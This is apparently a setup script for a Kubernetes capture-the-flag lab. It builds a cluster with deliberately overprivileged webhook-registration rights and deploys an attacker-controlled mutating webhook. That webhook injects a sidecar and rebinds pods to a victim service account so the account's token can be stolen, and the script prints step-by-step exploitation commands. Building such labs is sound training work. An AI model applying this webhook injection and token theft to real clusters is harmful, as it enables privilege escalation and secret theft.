#!/bin/bash
set -euo pipefail
K8S_ID="k8s-25"
CLUSTER_NAME="cve-k8s-25-webhook-inject"
source "$(dirname "$0")/../../../scripts/k8s-common.sh"

echo "[K8S-25] MutatingWebhookConfiguration Overprivileged Registration"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Pre-loading container images into KIND..."
k8s_load_images alpine:latest nginx:1.24-alpine python:3.10-slim bitnami/kubectl:1.28

echo "[*] Setting up scenario infrastructure..."
k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: attacker-ns
---
apiVersion: v1
kind: Namespace
metadata:
  name: target-ns
---
# Attacker SA: overprivileged "platform operator" role - can register
# MutatingWebhookConfiguration objects and manage pods inside attacker-ns
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: webhook-admin
rules:
  - apiGroups: ["admissionregistration.k8s.io"]
    resources: ["mutatingwebhookconfigurations"]
    verbs: ["create", "get", "list", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: webhook-admin
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker-ns
roleRef:
  kind: ClusterRole
  name: webhook-admin
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-pods
  namespace: attacker-ns
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "get", "list", "update", "delete"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-pods
  namespace: attacker-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker-ns
roleRef:
  kind: Role
  name: attacker-pods
  apiGroup: rbac.authorization.k8s.io
---
# Victim SA (in the attacker's namespace so a pod can use it) with secrets
# read permission ONLY in target-ns - the token the attacker must steal
apiVersion: v1
kind: ServiceAccount
metadata:
  name: victim-sa
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: target-secret-reader
  namespace: target-ns
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: target-secret-reader
  namespace: target-ns
subjects:
  - kind: ServiceAccount
    name: victim-sa
    namespace: attacker-ns
roleRef:
  kind: Role
  name: target-secret-reader
  apiGroup: rbac.authorization.k8s.io
---
# Attacker pod (kubectl available, uses attacker-sa)
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attacker-ns
  labels:
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

echo "[*] Storing flag as Secret in target namespace..."
k8s_create_k8s_secret "vault-flag" "target-ns"

echo "[*] Deploying attacker-controlled webhook server (self-signed TLS, CA in /shared)..."
k8s_apply << 'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mutating-webhook
  namespace: attacker-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: mutating-webhook
  template:
    metadata:
      labels:
        app: mutating-webhook
    spec:
      serviceAccountName: attacker-sa
      containers:
        - name: webhook
          image: python:3.10-slim
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              pip install flask cryptography >/dev/null 2>&1
              python3 - << 'PYTHON'
              import os, base64, json, datetime, ipaddress
              from cryptography import x509
              from cryptography.x509.oid import NameOID
              from cryptography.hazmat.primitives import hashes, serialization
              from cryptography.hazmat.primitives.asymmetric import rsa

              os.makedirs('/certs', exist_ok=True)
              os.makedirs('/shared', exist_ok=True)

              key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
              name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'mutating-webhook.attacker-ns.svc')])
              now = datetime.datetime.now(datetime.timezone.utc)
              ca = (
                  x509.CertificateBuilder()
                  .subject_name(name)
                  .issuer_name(name)
                  .public_key(key.public_key())
                  .serial_number(x509.random_serial_number())
                  .not_valid_before(now - datetime.timedelta(days=1))
                  .not_valid_after(now + datetime.timedelta(days=365))
                  .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
                  .sign(key, hashes.SHA256())
              )
              server_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
              server = (
                  x509.CertificateBuilder()
                  .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'mutating-webhook.attacker-ns.svc')]))
                  .issuer_name(name)
                  .public_key(server_key.public_key())
                  .serial_number(x509.random_serial_number())
                  .not_valid_before(now - datetime.timedelta(days=1))
                  .not_valid_after(now + datetime.timedelta(days=365))
                  .add_extension(
                      x509.SubjectAlternativeName([
                          x509.DNSName('mutating-webhook.attacker-ns.svc'),
                          x509.DNSName('mutating-webhook.attacker-ns.svc.cluster.local'),
                      ]),
                      critical=False,
                  )
                  .sign(key, hashes.SHA256())
              )
              open('/certs/tls.key', 'wb').write(server_key.private_bytes(
                  serialization.Encoding.PEM,
                  serialization.PrivateFormat.TraditionalOpenSSL,
                  serialization.NoEncryption(),
              ))
              open('/certs/tls.crt', 'wb').write(server.public_bytes(serialization.Encoding.PEM))
              open('/shared/ca.crt', 'wb').write(ca.public_bytes(serialization.Encoding.PEM))
              print('certs generated')
              PYTHON
              cat > /app.py << 'PY'
              from flask import Flask, request, jsonify
              import json
              app = Flask(__name__)

              @app.route('/mutate', methods=['POST'])
              def mutate():
                  review = request.get_json()
                  uid = review['request']['uid']
                  patch = [
                      {"op": "add", "path": "/spec/serviceAccountName", "value": "victim-sa"},
                      {"op": "add", "path": "/spec/containers/-", "value": {
                          "name": "injected-sidecar",
                          "image": "alpine:latest",
                          "imagePullPolicy": "IfNotPresent",
                          "command": ["sh", "-c"],
                          "args": [
                              "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/token.txt; sleep 3600"
                          ]
                      }}
                  ]
                  return jsonify({
                      "apiVersion": "admission.k8s.io/v1",
                      "kind": "AdmissionReview",
                      "response": {
                          "uid": uid,
                          "allowed": True,
                          "patchType": "JSONPatch",
                          "patch": json.dumps(patch).encode('utf-8').decode('utf-8')
                      }
                  })

              @app.route('/health', methods=['GET'])
              def health():
                  return jsonify({"status": "ok"})

              if __name__ == '__main__':
                  app.run(host='0.0.0.0', port=8443,
                          ssl_context=('/certs/tls.crt', '/certs/tls.key'))
              PY
              python3 /app.py
          ports:
            - containerPort: 8443
          volumeMounts:
            - name: shared
              mountPath: /shared
      volumes:
        - name: shared
          emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: mutating-webhook
  namespace: attacker-ns
spec:
  selector:
    app: mutating-webhook
  ports:
    - port: 443
      targetPort: 8443
YAML

k8s_wait_pods_label "app=mutating-webhook" "attacker-ns"
k8s_wait_pod "attacker-pod" "attacker-ns"
sleep 5

k8s_info
echo "    Flag Secret: vault-flag in target-ns namespace"
echo "    Victim SA: victim-sa (attacker-ns) - secrets read only in target-ns"
echo ""
echo "    Exploitation steps (attacker uses attacker-sa token):"
echo "    1. TOKEN=\$(kubectl exec -n attacker-ns attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "    2. Get the webhook CA: kubectl exec -n attacker-ns deploy/mutating-webhook -- cat /shared/ca.crt"
echo "    3. Register a MutatingWebhookConfiguration (namespaceSelector: attacker-ns) with that caBundle"
echo "    4. Create a trigger pod in attacker-ns -> webhook injects sidecar and patches serviceAccountName=victim-sa"
echo "    5. Read victim-sa token: kubectl exec trigger-pod -n attacker-ns -c injected-sidecar -- cat /tmp/token.txt"
echo "    6. Use the token to read vault-flag in target-ns via the Kubernetes API"
